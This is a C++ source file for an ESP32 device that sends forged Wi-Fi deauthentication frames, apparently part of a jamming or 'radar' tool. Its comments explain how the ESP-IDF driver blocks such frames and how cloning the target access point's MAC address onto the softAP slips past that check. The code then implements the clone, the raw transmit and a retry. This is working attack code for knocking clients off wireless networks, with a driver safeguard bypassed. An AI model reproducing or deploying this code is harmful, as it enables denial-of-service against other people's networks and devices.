#include "deauth_tx.h"

#include <esp_wifi.h>

#include "deauth.h"

// Raw-frame TX. On arduino-esp32 2.0.x (ESP-IDF 4.4) the STA interface
// validates outgoing management frames and rejects deauth with
// ESP_ERR_INVALID_ARG — the documented supported set there is only
// beacon / probe request / probe response / action / non-QoS data
// (verified on hardware: every burst came back 0x102). The AP interface
// applies no such check — this is the TX path ESP32 Marauder uses — so
// frames leave through WIFI_IF_AP. Requires WIFI_MODE_APSTA with a
// configured AP (scanner.cpp): without it the API accepts the frame yet
// nothing is transmitted. The softAP is hidden and beacons every 10 s, so
// it stays nearly silent.
//
// 2026-10-18 update: on BOTH IDF 4.4.4 (core 2.0.7) and 4.4.7 (core 2.0.17)
// the AP path ALSO rejects deauth frames: every burst came back
// ESP_ERR_INVALID_ARG (0x102) with "wifi:unsupport frame type: 0c0" in the
// lab against alma_lab, i.e. zero frames transmitted. The remaining trick
// Marauder uses: clone the target AP's MAC onto the softAP before TX, so the
// forged frame's SA is the interface's own MAC and passes the driver's
// ownership sanity check. Restore the original MAC when the run ends.

namespace {
uint8_t origMac[6];
bool origMacSaved = false;
}  // namespace

void deauthTxCloneApMac(const uint8_t bssid[6]) {
  if (!origMacSaved) {
    esp_wifi_get_mac(WIFI_IF_AP, origMac);
    origMacSaved = true;
  }
  esp_wifi_set_mac(WIFI_IF_AP, const_cast<uint8_t*>(bssid));
}

void deauthTxRestoreApMac() {
  if (origMacSaved) esp_wifi_set_mac(WIFI_IF_AP, origMac);
}

int deauthTxSend(const uint8_t bssid[6], const uint8_t dest[6], uint16_t seq,
                 uint16_t reason) {
  uint8_t frame[radar::kDeauthLen];
  radar::buildDeauth(frame, bssid, dest, seq, reason);
  const int e = esp_wifi_80211_tx(WIFI_IF_AP, frame, radar::kDeauthLen, false);
  if (e == ESP_OK) return ESP_OK;
  const int e2 =
      esp_wifi_80211_tx(WIFI_IF_AP, frame, radar::kDeauthLen, true);
  return e2 == ESP_OK ? ESP_OK : e;
}